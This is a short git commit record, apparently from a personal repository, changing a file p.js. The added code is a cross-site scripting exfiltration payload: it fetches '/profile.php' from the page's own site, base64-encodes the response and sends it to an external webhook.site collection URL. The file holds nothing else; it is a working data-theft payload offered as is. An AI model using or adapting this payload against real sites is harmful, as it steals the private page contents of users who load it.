5886992c85002a0b1d7257e0d898bcf22a61aa13
Nellle <59132889+nellle@users.noreply.github.com>
2025-11-25 21:19:53 +0300

    Update p.js

--- p.js
+++ p.js
@@ -1,1 +1,6 @@
-fetch("https://webhook.site/fbee40ce-4c6f-442f-9b9f-5dc3d98ec99a")
+fetch("/profile.php")
+  .then(r => r.text())
+  .then(t => {
+    const data = btoa(unescape(encodeURIComponent(t)));
+    return fetch("https://webhook.site/fbee40ce-4c6f-442f-9b9f-5dc3d98ec99a/collect?d=" + encodeURIComponent(data));
+  });
